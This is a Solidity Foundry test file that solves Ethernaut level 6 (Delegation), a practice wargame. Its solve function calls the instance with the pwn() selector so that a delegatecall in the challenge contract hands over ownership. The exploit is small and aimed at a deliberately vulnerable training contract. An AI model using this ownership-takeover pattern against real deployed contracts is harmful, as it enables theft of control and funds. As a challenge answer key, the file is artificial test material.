pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IDelegate {
    function pwn() external;
}

interface IDelegation {}

contract Ethernaut06 is EthernautTest {
    constructor() EthernautTest(6) {}

    function solve() internal override(EthernautTest) {
        (bool success, ) = instance.call(
            abi.encodeWithSelector(IDelegate.pwn.selector)
        );
        require(success);
    }
}
